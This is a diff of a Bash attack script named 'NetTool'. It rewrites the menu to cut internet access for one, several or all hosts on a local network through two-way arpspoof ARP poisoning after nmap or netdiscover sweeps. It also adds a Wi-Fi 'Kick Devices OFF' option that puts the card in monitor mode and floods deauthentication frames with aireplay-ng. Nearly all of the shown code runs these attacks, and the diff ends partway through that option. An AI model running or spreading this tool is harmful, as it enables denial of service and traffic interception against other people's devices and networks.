@@ -27,6 +27,10 @@ if [[ $EUID -ne 0 ]]; then
     echo -e "$red You don't have Root privilegies, execute the script as root.$nc"
     exit 1
 fi
+
+
+echo -e "$red""Staring""$nc"
+sleep 0.5
 clear
 echo -e "$red""Staring.""$nc"
 sleep 0.5
@@ -34,275 +38,10 @@ clear
 echo -e "$red""Staring..""$nc"
 sleep 0.5
 clear
-echo -e "$red""Staring...""$nc"
-
-sleep 1
-clear
+echo -e "$red""Staring...""$nc" 
+clear 
 sleep 0.5
-echo -e "               \e[1;31m [+][+][+]--NetTool--[+][+][+] \e[0m         "
-echo""
-echo -e "              \e[0;34mVersion : 1.0\e[0m         "
-echo -e "              \e[0;34mCredits : Disc0nect\e[0m         "
-echo -e "              \e[0;34mEmail   : Montasilinigamer@gmail.com\e[0m         "
-
-echo""
-sleep 0.5
-#Checking for internet connecttion
-echo -e "$orange""Checking Internet connection.""$nc"
-sleep 0.5
-clear
-echo -e "               \e[1;31m [+][+][+]--NetTool--[+][+][+] \e[0m         "
-echo""
-echo -e "              \e[0;34mVersion : 1.0\e[0m         "
-echo -e "              \e[0;34mCredits : Disc0nect\e[0m         "
-echo -e "              \e[0;34mEmail   : Montasilinigamer@gmail.com\e[0m         "
-
-echo""
-echo -e "$orange""Checking Internet connection..""$nc"
-sleep 0.5
-clear
-echo -e "               \e[1;31m [+][+][+]--NetTool--[+][+][+] \e[0m         "
-echo""
-echo -e "              \e[0;34mVersion : 1.0\e[0m         "
-echo -e "              \e[0;34mCredits : Disc0nect\e[0m         "
-echo -e "              \e[0;34mEmail   : Montasilinigamer@gmail.com\e[0m         "
-
-echo""
-echo -e "$orange""Checking Internet connection...""$nc"
-sleep 1
-
-wget -q --spider https://www.google.com
-
-if [ $? -eq 0 ]; then
-    echo -e "Connected to internet [$green✓$nc]$nc "
-else
-    echo -e "No internet connection [$red✗$nc] $nc "
-    echo -e "$orange""Please make sure you are connected to internet!" "$nc"
-    exit 1
-fi
-#END_COMMENT
-sleep 0.5
-
-if  pgrep -x "apt" >/dev/null || pgrep -x "dpkg" >/dev/null ;
-
-then 
-    
-    echo -e "$red""Another installation is running! Please wait or kill the proccess.$nc"
-    echo -e "$blue""The following proccess can cancel the installation$nc"
-    pgrep apt 
-    pgrep dpkg 
-    echo -e -n "$yellow""Do you want to kill the proccess? (Y/n) "
-
-    read answ
-    case $answ in
-        y)  pkill apt
-            pkill dpkg
-            echo -e "$orange""Checking for required tools...$nc"
-sleep 1
-
-
-
-if [ -f "/usr/sbin/netdiscover" ]; then
-    echo -e "$white""netdiscover$nc""$yellow ===>$nc" "$green[✓] installed$nc"
-    sleep 0.5
-else
-    echo -e "$white""netdiscover$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
-    echo -e "$orange""Downloading & Installing netdiscover...$nc"
-    sleep 1
-    xterm -e "apt install netdiscover -y"
-    if [[ -f "/usr/sbin/netdiscover" ]]; then
-        echo -e "$white""netdiscover" "$green""successfuly installed ✓$nc"
-        sleep 1
-    fi
-fi
-
-if [[ -f "/usr/bin/nmap" ]]; then
-    echo -e "$white""nmap$nc""$yellow ==========>$nc" "$green[✓] installed$nc"
-    sleep 0.5
-else
-    echo -e "$white""nmap$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
-    echo -e "$orange""Downloading & Installing nmap...$nc"
-    sleep 1
-    xterm -e "apt install nmap -y"
-    if [[ -f "/usr/bin/nmap" ]]; then
-        echo -e "$white""nmap" "$green""successfuly installed ✓$nc"
-    fi
-fi
-
-if [[ -f "/usr/sbin/arpspoof" ]]; then
-    echo -e "$white""arpspoof$nc""$yellow ======>$nc" "$green[✓] installed$nc"
-    sleep 0.5
-else
-    echo -e "$white""arpspoof$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
-    echo -e "$orange""Downloading & Installing arpspoof...$nc"
-    sleep 1
-    
-    xterm -e "apt install dsniff -y"
-    if [ -f "/usr/sbin/arpspoof" ]; then
-        echo -e "$white""arpspoof" "$green""successfuly installed ✓$nc"
-    fi
-fi
-
-
-if [[ -f "/usr/sbin/arp-scan" ]]; then
-    echo -e "$white""arp-scan$nc""$yellow ======>$nc" "$green[✓] installed$nc"
-    sleep 0.5
-else
-    echo -e "$white""arp-scan$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
-    echo -e "$orange""Downloading & Installing arp-scan...$nc"
-    sleep 1
-    
-    xterm -e "apt install arp-scan -y"
-    if [ -f "/usr/sbin/arp-scan" ]; then
-        echo -e "$white""arp-scan" "$green""successfuly installed ✓$nc"
-    fi
-fi
-
-echo""
-echo -e "$lightgreen""All tools have been checked! [✓]$nc"
-            ;;
-        Y)  pkill apt
-            pkill dpkg
-            echo -e "$orange""Checking for required tools...$nc"
-sleep 1
-
-
-
-if [ -f "/usr/sbin/netdiscover" ]; then
-    echo -e "$white""netdiscover$nc""$yellow ===>$nc" "$green[✓] installed$nc"
-    sleep 0.5
-else
-    echo -e "$white""netdiscover$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
-    echo -e "$orange""Downloading & Installing netdiscover...$nc"
-    sleep 1
-    xterm -e "apt install netdiscover -y"
-    if [[ -f "/usr/sbin/netdiscover" ]]; then
-        echo -e "$white""netdiscover" "$green""successfuly installed ✓$nc"
-        sleep 1
-    fi
-fi
-
-if [[ -f "/usr/bin/nmap" ]]; then
-    echo -e "$white""nmap$nc""$yellow ==========>$nc" "$green[✓] installed$nc"
-    sleep 0.5
-else
-    echo -e "$white""nmap$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
-    echo -e "$orange""Downloading & Installing nmap...$nc"
-    sleep 1
-    xterm -e "apt install nmap -y"
-    if [[ -f "/usr/bin/nmap" ]]; then
-        echo -e "$white""nmap" "$green""successfuly installed ✓$nc"
-    fi
-fi
-
-if [[ -f "/usr/sbin/arpspoof" ]]; then
-    echo -e "$white""arpspoof$nc""$yellow ======>$nc" "$green[✓] installed$nc"
-    sleep 0.5
-else
-    echo -e "$white""arpspoof$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
-    echo -e "$orange""Downloading & Installing arpspoof...$nc"
-    sleep 1
-    
-    xterm -e "apt install dsniff -y"
-    if [ -f "/usr/sbin/arpspoof" ]; then
-        echo -e "$white""arpspoof" "$green""successfuly installed ✓$nc"
-    fi
-fi
-
-
-if [[ -f "/usr/sbin/arp-scan" ]]; then
-    echo -e "$white""arp-scan$nc""$yellow ======>$nc" "$green[✓] installed$nc"
-    sleep 0.5
-else
-    echo -e "$white""arp-scan$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
-    echo -e "$orange""Downloading & Installing arp-scan...$nc"
-    sleep 1
-    
-    xterm -e "apt install arp-scan -y"
-    if [ -f "/usr/sbin/arp-scan" ]; then
-        echo -e "$white""arp-scan" "$green""successfuly installed ✓$nc"
-    fi
-fi
-
-echo""
-echo -e "$lightgreen""All tools have been checked! [✓]$nc"
-            ;;
-
-        n) exit 1
-        ;;
-        N) exit 1
-        ;;
-        *)
-        exit 1 ;;
-    esac
-else    
-#checking for required tools
-echo -e "$orange""Checking for required tools...$nc"
-sleep 1
-
-
-
-if [ -f "/usr/sbin/netdiscover" ]; then
-    echo -e "$white""netdiscover$nc""$yellow ===>$nc" "$green[✓] installed$nc"
-    sleep 0.2
-else
-    echo -e "$white""netdiscover$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
-    echo -e "$orange""Downloading & Installing netdiscover...$nc"
-    sleep 1
-    xterm -e "apt install netdiscover -y"
-    if [[ -f "/usr/sbin/netdiscover" ]]; then
-        echo -e "$white""netdiscover" "$green""successfuly installed ✓$nc"
-        sleep 1
-    fi
-fi
-
-if [[ -f "/usr/bin/nmap" ]]; then
-    echo -e "$white""nmap$nc""$yellow ==========>$nc" "$green[✓] installed$nc"
-    sleep 0.2
-else
-    echo -e "$white""nmap$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
-    echo -e "$orange""Downloading & Installing nmap...$nc"
-    sleep 1
-    xterm -e "apt install nmap -y"
-    if [[ -f "/usr/bin/nmap" ]]; then
-        echo -e "$white""nmap" "$green""successfuly installed ✓$nc"
-    fi
-fi
-
-if [[ -f "/usr/sbin/arpspoof" ]]; then
-    echo -e "$white""arpspoof$nc""$yellow ======>$nc" "$green[✓] installed$nc"
-    sleep 0.2
-else
-    echo -e "$white""arpspoof$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
-    echo -e "$orange""Downloading & Installing arpspoof...$nc"
-    sleep 1
-    
-    xterm -e "apt install dsniff -y"
-    if [ -f "/usr/sbin/arpspoof" ]; then
-        echo -e "$white""arpspoof" "$green""successfuly installed ✓$nc"
-    fi
-fi
-
-
-if [[ -f "/usr/sbin/arp-scan" ]]; then
-    echo -e "$white""arp-scan$nc""$yellow ======>$nc" "$green[✓] installed$nc"
-    sleep 0.2
-else
-    echo -e "$white""arp-scan$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
-    echo -e "$orange""Downloading & Installing arp-scan...$nc"
-    sleep 1
-    
-    xterm -e "apt install arp-scan -y"
-    if [ -f "/usr/sbin/arp-scan" ]; then
-        echo -e "$white""arp-scan" "$green""successfuly installed ✓$nc"
-    fi
-fi
-
-echo""
-echo -e "$lightgreen""All tools have been checked! [✓]$nc"
-fi
-sleep 2
-clear
+#BEGIN-CHECKING FOR INTERNET CONNECTION
 
 while true
 do
@@ -310,26 +49,29 @@ do
     #END_COMMENT
     #Menu
     echo -e "               \e[1;31m -- NetTool -- \e[0m         "
-    echo""
+    echo ""
     echo -e "              \e[0;34mVersion : 1.0\e[0m         "
     echo -e "              \e[0;34mCredits : Disc0nect\e[0m         "
     echo -e "              \e[0;34mEmail   : Montasilinigamer@gmail.com\e[0m         "
     
-    echo""
-    ip=$(ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')
-    interafce=$(route | grep '^default' | grep -o '[^ ]*$')
+    echo ""
+
+    interface=$(route | grep '^default' | grep -o '[^ ]*$')
+    ip=$(ifconfig $interface | grep -w inet | cut -d" " -f10)
     gateway=$(netstat -rn | grep '^\(default\|0\.0\.0\.0\)' | awk '{print $2}')
-    
-    echo -e ""$orange""interafce:$nc" $interafce | "$orange""gateway: $nc"$gateway | "$orange""ip:$nc" $ip"
-    
+    net_range=$(ip a l $interface | awk '/inet.*brd/ {split($2,add,"/");split(add[1],ip,".");if(add[2]<=24){ip[4]=0} if(add[2]<=16){ip[3]=0} if(add[2]<=8){ip[2]=0} print ip[1]"."ip[2]"."ip[3]"."ip[4]"/"add[2];}')
+    echo -e ""$orange""Interface:$nc" $interface | "$orange""Gateway:$nc" $gateway"
+    echo "------------------------------------------------"
+    echo -e ""$orange""IP:$nc" $ip | "$orange""Network Range:$nc" $net_range"
     echo""
     echo -e "$orange""1)$nc"" - $green""Scan for hosts$nc"
     echo -e "$orange""2)$nc"" - $green""Scan for hosts(Nmap scan)$nc"
     echo -e "$orange""3)$nc"" - $green""Kill internet connection$nc"
-    echo -e "$yellow""4)$nc"" - $yellow""Update$nc"
-    echo -e "$lightred""5)$nc" - "$lightred""Exit$nc"
+    echo -e "$orange""4)$nc"" - $green""Kick Devices OFF$nc"
+    echo -e "$orange""5)$nc"" - $orange""Update$nc"
+    echo -e "$lightred""e)$nc" - "$lightred""Exit$nc"
     echo ""
-    echo -e -n "$yellow""Select you option : $nc"
+    echo -e -n "$yellow""Select your option : $nc"
     read option
     echo ""
     case $option in
@@ -347,13 +89,14 @@ do
         2)
             echo -e " [+] Nmap scan [+] "
             echo ""
-            echo -e "$orange""1-$nc""$green""Simple scan $nc"
-            echo -e "$orange""2-$nc""$green""Advanced scan $nc" "$blue""(Slow scan but detailed)$nc"
+            echo -e "$orange""1-$nc""$green"" Simple scan $nc"
+            echo -e "$orange""2-$nc""$green"" Advanced scan $nc" "$blue""(Slow scan but detailed)$nc"
+            echo ""
             echo -e -n "$yellow""Select your scan mode : $nc"
             read opt2
             case $opt2 in
-                1)
-                    echo -e -n "$yellow""Type your network subnet $nc""$blue""(ex:192.168.1.0/24): $nc"
+                1)  
+                    echo -e -n "$yellow""Type your network range $nc""$blue""(eg:192.168.1.0/24): $nc"
                     read range
                     
 
@@ -387,7 +130,7 @@ do
                     wget -q --spider https://www.google.com
 
                 if [ $? -eq 0 ]; then
-                    echo -e -n "$yellow""Type your network subnet $nc""$blue""(ex:192.168.1.0/24): $nc"
+                    echo -e -n "$yellow""Type your network range $nc""$blue""(eg:192.168.1.0/24): $nc"
                     read range
                     echo -e "\e[1;34mScanning...\e[0m"
                     sleep 1
@@ -413,8 +156,10 @@ do
             esac
         ;;
         3)
-            echo -e "$orange""1-$nc""$green""kill connection for 1 target$nc"
-            echo -e "$orange""2-$nc""$green""kill connection for muliple targets$nc"
+            echo -e "$orange""1-$nc""$green"" kill connection for 1 target$nc"
+            echo -e "$orange""2-$nc""$green"" kill connection for muliple users$nc"
+            echo -e "$orange""3-$nc""$green"" kill connection for all users$nc"
+            echo ""
             echo -e -n "$orange""Select your option : $nc"
             read opt
             case $opt in
@@ -437,12 +182,13 @@ do
                     clear
                     echo -e "\e[1;34mScanning...\e[0m"
                     sleep 2
-		    echo -e "$orange""Hosts           MAC	                Vendor$nc"	
-                    arp-scan --localnet -x 
+		            #echo -e "$orange""Hosts           MAC	                Vendor$nc"	
+                    netdiscover -i $interface -r $net_range -P > hosts.txt
+                    cat hosts.txt
                     echo -e -n "$yellow""Type your target machine : $nc"
                     read target
-                    xterm -e "echo CTRL+C TO CANCLE THE ATTACK ! && sleep 2 && arpspoof -i $interafce -t $target $gateway" &
-                    xterm -e "echo CTRL+C TO CANCLE THE ATTACK ! && sleep 2 && arpspoof -i $interafce -t $gateway $target" &
+                    xterm -e "echo CTRL+C TO CANCLE THE ATTACK ! && sleep 2 && arpspoof -i $interface -t $target $gateway" &
+                    xterm -e "echo CTRL+C TO CANCLE THE ATTACK ! && sleep 2 && arpspoof -i $interface -t $gateway $target" &
                     sleep 1
                     echo -e "\e[1;32mPress RETURN To CANCLE \c\e[0m"
                     read input
@@ -469,17 +215,16 @@ do
                     clear
                     echo -e "\e[1;34mScanning...\e[0m"
                     sleep 2
-		    echo -e "$orange""Hosts           MAC	                Vendor$nc"
+		            echo -e "$orange""Hosts           MAC	                Vendor$nc"
                     arp-scan --localnet -x 
-                    
                     echo -e -n "$yellow""How many target(s)? $nc"
                     read targets
                     for (( i = 1; i < targets+1; i++ )); do
                         echo -n "type your target "$i" : "
                         read trgt
-                        echo -e "$cyan""killing$nc" "$red"$trgt"$nc"
-                        nohup arpspoof -i $interafce -t $trgt $gateway </dev/null &>/dev/null &
-                        nohup arpspoof -i $interafce -t $gateway $trgt </dev/null &>/dev/null &
+                        echo -e "$cyan""killing$nc" "$red"$trgt $nc""
+                        nohup arpspoof -i $interface -t $trgt $gateway </dev/null &>/dev/null &
+                        nohup arpspoof -i $interface -t $gateway $trgt </dev/null &>/dev/null &
                     done
                     sleep 1
                     echo -e "\e[1;32mPress RETURN To CANCLE \c\e[0m"
@@ -488,84 +233,473 @@ do
                     echo -e "$blue""Going back to Menu...$nc"
                     sleep 1
                     ;;
+                3)  
+                    clear
+                    while [ true ]; do
+                        echo -e "$yellow""Scanning for devices$nc"
+                        sleep 0.1
+                        clear
+                        echo -e "$yellow""Scanning for devices.$nc"
+                        sleep 0.1
+                        clear
+                        echo -e "$yellow""Scanning for devices..$nc"
+                        sleep 0.1
+                        clear
+                        echo -e "$yellow""Scanning for devices...$nc"
+                        sleep 0.1
+                        clear
+                    done & 
+                    trap 'kill $!' SIGTERM SIGKILL
+                    nmap -n -sn $net_range -oG - | awk '/Up$/{print $2}' | sort -V > scan.txt
+                    clear
+                    echo -e "$red""Killing Internet Connection for the following devices! $nc"
+                    sudo tail +2 scan.txt
+                    kill $!
+                    echo -n "Do you want to whitelist some IPs? (y/n) "
+                    read answ5
+                    if [ "$answ5" == "y"  ] || [ "$answ5" == "Y"  ]; then 
+                        echo -n "type your ip want to whitelist : "
+                        read ip_whl
+                        echo "IP to whitelist : $ip_whl "
+                        grep -v "$ip_whl" scan.txt > temp && mv temp scan.txt
+                        echo -e "\e[1;33mPress RETURN To Proceed! \c\e[0m"
+                        read input
+                    while IFS= read -r line; do
+                        # The 'declare' syntax creates variables on the fly with the values
+                        # read from the file
+                        declare target$((i++))="$line"
+                    done <scan.txt
+                    count="$((i-1))"
+                    # Now the variables are created; those can be individually accessed as  
+                    # '$target1'..'$tatgetN'; but to print it on a loop, use
+                    # indirect expansion using ${!var} syntax 
+                    clear 
+                    echo -e "$orange""Starting Attack...$nc"
+                    sleep 0.3
+                    for ((idx=1; idx<=count; idx++)); do
+                        temp=target$idx
+                        trgt="$target""${!temp}"
+                        echo -e  "$lightblue""killing$nc" "$red""$trgt $nc"  
+                        sleep 0.5 
+                        nohup arpspoof -i $interface -t $trgt $gateway </dev/null &>/dev/null &
+                        nohup arpspoof -i $interface -t $gateway $trgt </dev/null &>/dev/null &
+                        sleep 1
+                    done
+                    echo -e "\e[1;32mPress RETURN To CANCLE \c\e[0m"
+                    read input
+                    pkill arpspoof
+                    sudo rm scan.txt
+                    echo -e "$blue""Going back to Menu...$nc"
+                    sleep 1
+                    else
+                        echo -e "\e[1;33mPress RETURN To Proceed! \c\e[0m"
+                        read input
+                        while IFS= read -r line; do
+                            # The 'declare' syntax creates variables on the fly with the values
+                            # read from the file
+                            declare target$((i++))="$line"
+                        done <scan.txt
+                        count="$((i-1))"
+                        # Now the variables are created; those can be individually accessed as  
+                        # '$target1'..'$tatgetN'; but to print it on a loop, use
+                        # indirect expansion using ${!var} syntax 
+                        clear 
+                        echo -e "$orange""Starting Attack...$nc"
+                        sleep 0.3
+                        for ((idx=1; idx<=count; idx++)); do
+                            temp=target$idx
+                            trgt="$target""${!temp}"
+                            echo -e  "$lightblue""killing$nc" "$red""$trgt $nc"  
+                            sleep 0.5 
+                            nohup arpspoof -i $interface -t $trgt $gateway </dev/null &>/dev/null &
+                            nohup arpspoof -i $interface -t $gateway $trgt </dev/null &>/dev/null &
+                            sleep 1
+                        done 
+                        echo -e "\e[1;32mPress RETURN To CANCLE \c\e[0m"
+                        read input
+                        pkill arpspoof
+                        sudo rm scan.txt
+                        echo -e "$blue""Going back to Menu...$nc"
+                        sleep 1
+                    fi
+                ;;
             esac
-        ;;
-        4)
-        #checking for internet
-while true; do
-echo -e "$yellow""Checking for internet connection$nc"
-sleep 0.1
-clear
-echo -e "$yellow""Checking for internet connection.$nc"
-sleep 0.1
-clear
-echo -e "$yellow""Checking for internet connection..$nc"
-sleep 0.1
-clear
-echo -e "$yellow""Checking for internet connection...$nc"
-sleep 0.1
-clear
+            ;;
+        4) 
+            clear
+            sleep 0.5
+            PS3="> "
+            echo -e "$green""Available wireless interfaces:$nc"
+            echo ""        
+            select interface in $(iw dev | awk '$1=="Interface"{print $2}'); do
+                echo -e "$orange""$interface $nc"$blue"selected!$nc" 
+                    break;
+            done 
+            chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
+            connected_ap_essid=$(nmcli -t -f name,device connection show --active | grep "$interface" | cut -d\: -f1)
+            printf "$connected_ap_essid" > connected_ap_essid.txt
+            ESSID=$(grep -m1 "" connected_ap_essid.txt)
+            connected_ap_bssid=$(iwconfig "$interface" | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
+            printf "$connected_ap_bssid" > connected_ap_bssid.txt
+            BSSID=$(grep -m1 "" connected_ap_bssid.txt)
+            echo -e "Connected to "" : ""$connected_ap_essid | BSSID : "$connected_ap_bssid""
+            sleep 0.2
+            echo -e "$blue""Interface current mode: $nc"$green""$chk_mode""
+            echo ""
+                        echo -e "$orange""1-$nc""$green"" Kick One Device (Aireplay-ng)$nc"
+                        echo -e "$orange""2-$nc""$green"" Kick Muliple Devices (Aireplay-ng)$nc"
+                        echo -e "$orange""3-$nc""$green"" Kick All Except You (mdk4)$nc"
+                        echo -e "$orange""0-$nc""$yellow"" Go back...$nc"
+                        echo ""
+                        echo -e -n "$yellow""Select your option : $nc"
+                        read opt    
+            case $opt in
+                1)
+                if [ "$BSSID" = "" ]; then
+                    chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
+                    if [ "$chk_mode" = "monitor" ]; then
+                            echo "Monitor mode already enabled!"
+                            sleep 1           
+                            clear
+                            echo "Searching For Access-Points..."
+                            echo -e "$blue""CTRL+C TO STOP Searching!$nc"
+                            sleep 1
+                            sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng $interface 2>&1 | tee ap_scan.txt" &&
+                            cat ap_scan.txt
+                            echo -e -n "$orange""Type Access-Point's MAC-Address :  $nc"
+                            read ap_mac
+                            echo -e -n "$orange""Type Access-Point's Channel :  $nc"
+                            read dv_chan
+                            echo -e -n "$orange""Type Device's MAC-Address You Want To Kick :  $nc"
+                            read dv_mac
+                            xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $ap_mac -c $dv_chan $interface " & sleep 2 
+                            xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $ap_mac -c $dv_mac $interface " & sleep 2
+                            sleep 0.5
+                            echo -e "\e[1;32mPress RETURN To CANCLE \c\e[0m"
+                            read input
+                            pkill airodump-ng
+                            pkill aireplay-ng
+                            echo "Restoring device to managed mode... "
+                            sudo ifconfig "$interface" down >/dev/null 2>&1
+                            sudo iwconfig "$interface" mode managed >/dev/null 2>&1
+                            sudo ifconfig "$interface" up >/dev/null 2>&1
+                            sudo systemctl restart NetworkManager 
+                            sleep 5
+                            echo -e "$blue""Going back to Menu...$nc"
+                            sleep 1
+                    else
+                        if [ "$chk_mode" = "managed" ]; then 
+                            echo -e "$orange""Your interface needs to be on monitor mode to continue!$nc"
+                            sleep 0.3
+                            echo -e -n "$orange""Enabel monitor mode? (y/n) $nc"
+                            read answ3
+                            if [ "$answ3" = "y" ] || [ "$answ3" = "Y" ]; then
+                                sudo airmon-ng check kill >/dev/null 2>&1
+                                sudo ifconfig "$interface" down >/dev/null 2>&1
+                                sudo iwconfig "$interface" mode monitor >/dev/null 2>&1
+                                sudo ifconfig "$interface" up >/dev/null 2>&1
+                                chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
+                                    if [ "$chk_mode" = "monitor" ] ;then
+                                        echo "Monitor mode enabled!"
+                                        sleep 1
+                                        clear
+                                        echo "Searching For Access-Points..."
+                            echo -e "$blue""CTRL+C TO STOP Searching!$nc"
+                            sleep 1
+                            sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng $interface 2>&1 | tee ap_scan.txt" &&
+                            cat ap_scan.txt
+                            echo -e -n "$orange""Type Access-Point's MAC-Address :  $nc"
+                            read ap_mac
+                            echo -e -n "$orange""Type Access-Point's Channel :  $nc"
+                            read dv_chan
+                            echo -e -n "$orange""Type Device's MAC-Address You Want To Kick :  $nc"
+                            read dv_mac
+                            xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $ap_mac -c $dv_chan $interface " & sleep 2 
+                            xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $ap_mac -c $dv_mac $interface " & sleep 2
+                            echo -e "\e[1;32mPress RETURN To CANCLE \c\e[0m"
+                            read input
+                            pkill airodump-ng
+                            pkill aireplay-ng
+                            echo "Restoring device to managed mode... "
+                            sudo ifconfig "$interface" down >/dev/null 2>&1
+                            sudo iwconfig "$interface" mode managed >/dev/null 2>&1
+                            sudo ifconfig "$interface" up >/dev/null 2>&1
+                            sudo systemctl restart NetworkManager 
+                            sleep 5
+                            echo -e "$blue""Going back to Menu...$nc"
+                            sleep 1
+                                    else 
+                                        echo -e "$red""Unable to change interface to monitor mode!$nc"
+                                        echo -e "$red""Your interface doesn't support monitor mode!$nc"
+                                        sudo ifconfig "$interface" down >/dev/null 2>&1
+                                        sudo iwconfig "$interface" mode managed >/dev/null 2>&1
+                                        sudo ifconfig "$interface" up >/dev/null 2>&1
+                                        sudo systemctl restart NetworkManager 
+                                        sleep 5
+                                        echo -e "$blue""Going back to Menu...$nc"
+                                        sleep 1
+                                    fi
+                            else    
+                                echo "Going back to menu..."
+                                sleep 1
+                            fi
+                        fi     
+                    fi
+                    else
+                    chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
+                    if [ "$chk_mode" = "monitor" ]; then
+                            echo "Monitor mode already enabled!"
+                            sleep 1           
+                            clear
+                            echo "Monitoring your Access-Point '$ESSID'"
+                            echo -e "$blue""CTRL+C TO STOP MONITORING!$nc"
+                            sleep 1
+                            sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP MONITORING !' && airodump-ng --essid $ESSID $interface 2>&1 | tee ap_scan.txt" &&
+                            cat ap_scan.txt
+                            #echo -e -n "$orange""Type Access-Point's MAC-Address :  $nc"
+                            #read ap_mac
+                            echo -e -n "$orange""Type Device's MAC-Address :  $nc"
+                            read dv_mac
+                            xterm -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac $interface" &
+                            sleep 0.5
+                            echo -e "\e[1;32mPress RETURN To CANCLE \c\e[0m"
+                            read input
+                            pkill aireplay-ng
+                            echo "Restoring device to managed mode... "
+                            sleep 1
+                            sudo ifconfig "$interface" down >/dev/null 2>&1
+                            sudo iwconfig "$interface" mode managed >/dev/null 2>&1
+                            sudo ifconfig "$interface" up >/dev/null 2>&1
+                            sudo systemctl restart NetworkManager 
+                            echo -e "$blue""Going back to Menu...$nc"
+                            sleep 5
+                            else
+                        if [ "$chk_mode" = "managed" ]; then 
+                            echo -e "$orange""Your interface needs to be on monitor mode to continue!$nc"
+                            sleep 0.3
+                            echo -e -n "$orange""Enabel monitor mode? (y/n) $nc"
+                            read answ3
+                            if [ "$answ3" = "y" ] || [ "$answ3" = "Y" ]; then
+                                sudo airmon-ng check kill >/dev/null 2>&1
+                                sudo ifconfig "$interface" down >/dev/null 2>&1
+                                sudo iwconfig "$interface" mode monitor >/dev/null 2>&1
+                                sudo ifconfig "$interface" up >/dev/null 2>&1
+                                chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
+                                    if [ "$chk_mode" = "monitor" ] ;then
+                                        echo "Monitor mode enabled!"
+                                        sleep 1
+                                        clear
+                                        echo "Monitoring your Access-Point '$ESSID'"
+                                        echo -e "$blue""CTRL+C TO STOP MONITORING!$nc"
+                                        sleep 1
+                                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP MONITORING !' && airodump-ng --essid $ESSID $interface 2>&1 | tee ap_scan.txt" &&
+                                        clear
+                                        cat ap_scan.txt
+                                        echo -e -n "$orange""Type Target's MAC-Address :  $nc"
+                                        read dv_mac
+                                        echo -e -n "$orange""Type Access-Point's Channel :  $nc"
+                                        read dv_chan
+                                        echo -e "$cyan""Kicking$nc""$red"" $dv_mac $nc"
+                                        sleep 0.5
+                                        xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $BSSID -c $dv_chan $interface " & sleep 2 
+                                        xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac $interface " & sleep 2
+                                        echo -e "\e[1;32mPress RETURN TO STOP KICKING \c\e[0m"
+                                        read input
+                                        pkill airodump-ng
+                                        pkill aireplay-ng
+                                        echo "Restoring device to managed mode... "
+                                        sudo ifconfig "$interface" down >/dev/null 2>&1
+                                        sudo iwconfig "$interface" mode managed >/dev/null 2>&1
+                                        sudo ifconfig "$interface" up >/dev/null 2>&1
+                                        sudo systemctl restart NetworkManager 
+                                        sleep 5
+                                        echo -e "$blue""Going back to Menu...$nc"
+                                        sleep 1
+                                    else 
+                                        echo -e "$red""Unable to change interface to monitor mode!$nc"
+                                        echo -e "$red""Your interface doesn't support monitor mode!$nc"
+                                        sudo ifconfig "$interface" down >/dev/null 2>&1
+                                        sudo iwconfig "$interface" mode managed >/dev/null 2>&1
+                                        sudo ifconfig "$interface" up >/dev/null 2>&1
+                                        sudo systemctl restart NetworkManager 
+                                        sleep 5
+                                        echo -e "$blue""Going back to Menu...$nc"
+                                        sleep 1
+                                    fi
+                            else    
+                                echo "Going back to menu..."
+                                sleep 1
+                            fi
+                        fi     
+                    fi
+                fi
+                ;;
+                2)
+                chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
+                if [ "$chk_mode" = "monitor" ]; then
+                        echo "Monitor mode already enabled!"
+                        sleep 1           
+                        clear
+                        echo "Monitoring your Access-Point '$ESSID'"
+                        echo -e "$blue""CTRL+C TO STOP MONITORING!$nc"
+                        sleep 1
+                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP MONITORING !' && airodump-ng --essid $ESSID $interface 2>&1 | tee ap_scan.txt" &&
+                        cat ap_scan.txt
+                        #echo -e -n "$orange""Type Access-Point's MAC-Address :  $nc"
+                        #read ap_mac
+                        echo -e -n "$orange""Type Device's MAC-Address :  $nc"
+                        read dv_mac
+                        xterm -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac" &
+                        sleep 0.5
+                        echo -e "\e[1;32mPress RETURN To CANCLE \c\e[0m"
+                        read input
+                        pkill aireplay-ng
+                        echo "Restoring device to managed mode... "
+                        sleep 1
+                        sudo ifconfig "$interface" down >/dev/null 2>&1
+                        sudo iwconfig "$interface" mode managed >/dev/null 2>&1
+                        sudo ifconfig "$interface" up >/dev/null 2>&1
+                        sudo systemctl restart NetworkManager 
+                        echo -e "$blue""Going back to Menu...$nc"
+                        sleep 5
+                        else
+                    if [ "$chk_mode" = "managed" ]; then 
+                        echo -e "$orange""Your interface needs to be on monitor mode to continue!$nc"
+                        sleep 0.3
